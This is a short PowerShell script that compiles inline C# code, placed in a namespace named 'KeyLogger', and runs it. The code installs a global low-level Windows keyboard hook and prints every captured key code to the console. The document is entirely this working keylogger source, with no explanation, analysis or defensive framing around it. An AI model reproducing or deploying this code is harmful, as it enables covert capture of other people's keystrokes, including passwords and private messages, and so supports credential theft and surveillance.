Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;

    namespace KeyLogger {
        public static class Program {
            private const int WH_KEYBOARD_LL = 13;
            private static IntPtr hookId = IntPtr.Zero;

            public static void Begin() {
                hookId = SetHook();
                Application.Run();
                UnhookWindowsHookEx(hookId);
            }

            private static IntPtr SetHook() {
                IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
                return SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, moduleHandle, 0);
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode == 0)
                    Console.WriteLine(Marshal.ReadInt32(lParam) + " " + wParam + " ");
                return CallNextHookEx(hookId, nCode, wParam, lParam);
            }

            private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll")]
            private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll")]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
        }
    }
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Begin();
